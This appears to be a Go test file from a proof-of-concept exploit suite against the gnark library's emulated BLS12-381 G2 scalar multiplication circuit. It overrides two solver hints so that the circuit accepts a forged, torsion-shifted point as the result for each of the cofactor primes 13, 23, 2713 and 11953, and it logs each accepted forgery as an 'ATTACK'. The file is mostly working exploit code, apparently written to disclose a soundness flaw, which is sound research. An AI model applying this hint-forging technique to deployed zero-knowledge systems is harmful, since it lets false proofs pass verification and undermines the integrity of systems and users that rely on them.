package attack

// BLS12-381 G2 (cofactor small part 13^2 * 23^2 * 2713 * 11953). G2 lives over
// Fp2, so its affine point has four coordinates (X.A0, X.A1, Y.A0, Y.A1). The
// sw_bls12381 G2 ScalarMul routes through the same GLV+fake-GLV hinted output,
// so the same two hint overrides forge a torsion-shifted output.
//
// chosen-scalar reaches every cofactor prime below 2^(N/4+2): 13, 23, 2713,
// 11953. any-scalar is reachable here only for ell in {13,23} and only via the
// eigen-route sublattice reduction (v1+mu*v2 = 0 mod ell); the simple ell-scaling
// used for the small-ell groups overflows the sub-scalar range (13*r^{1/4} needs
// 68 bits > the 66-bit bound), so it is not exhibited in this minimal artifact.

import (
	"math/big"
	"testing"

	bls "github.com/consensys/gnark-crypto/ecc/bls12-381"
	blsfr "github.com/consensys/gnark-crypto/ecc/bls12-381/fr"
	"github.com/consensys/gnark/constraint/solver"
	"github.com/consensys/gnark/frontend"
	"github.com/consensys/gnark/std/algebra/emulated/sw_bls12381"
	"github.com/consensys/gnark/std/math/emulated"
	"github.com/consensys/gnark/std/math/emulated/emparams"
)

type bls12381G2Circuit struct {
	Q sw_bls12381.G2Affine
	S emulated.Element[emparams.BLS12381Fr]
	R sw_bls12381.G2Affine
}

func (c *bls12381G2Circuit) Define(api frontend.API) error {
	g2, err := sw_bls12381.NewG2(api)
	if err != nil {
		return err
	}
	res := g2.ScalarMul(&c.Q, &c.S)
	g2.AssertIsEqual(res, &c.R)
	return nil
}

func solveBLSG2(t *testing.T, Q bls.G2Affine, s *big.Int, out bls.G2Affine, vec [4]*big.Int) error {
	ccs := compileOnce(t, "blsG2", &bls12381G2Circuit{})
	w := &bls12381G2Circuit{Q: sw_bls12381.NewG2Affine(Q), S: emulated.ValueOf[emparams.BLS12381Fr](s), R: sw_bls12381.NewG2Affine(out)}
	wit, err := frontend.NewWitness(w, scalarField())
	if err != nil {
		t.Fatal(err)
	}
	coords := []*big.Int{out.X.A0.BigInt(new(big.Int)), out.X.A1.BigInt(new(big.Int)), out.Y.A0.BigInt(new(big.Int)), out.Y.A1.BigInt(new(big.Int))}
	hs := sw_bls12381.GetHints() // [...,3:scalarMulG2Hint,4:rationalReconstructExtG2,...]
	return ccs.IsSolved(wit,
		solver.OverrideHint(solver.GetHintID(hs[3]), forgeOutputHint(coords)),
		solver.OverrideHint(solver.GetHintID(hs[4]), forgeDecompHint(vec)),
	)
}

func TestBLS12381G2(t *testing.T) {
	r := blsfr.Modulus()
	_, _, _, Q := bls.Generators()

	for _, ell := range []int64{13, 23, 2713, 11953} {
		s := chosenScalar(blsLambda, ell, r)
		T := blsG2Torsion(ell)
		var honest, forged bls.G2Affine
		honest.ScalarMultiplication(&Q, s)
		forged.Add(&honest, &T)
		if err := solveBLSG2(t, Q, s, forged, chosenVec(ell)); err != nil {
			t.Fatalf("chosen-scalar ell=%d must be ACCEPTED (unpatched): %v", ell, err)
		}
		t.Logf("ATTACK chosen-scalar ell=%-6d accepted [s]Q+T as [s]Q", ell)
	}
	t.Log("any-scalar: reachable for ell in {13,23} via the eigen-route reduction; " +
		"the simple ell-scaling overflows the 66-bit sub-scalar range, so not shown here")
}
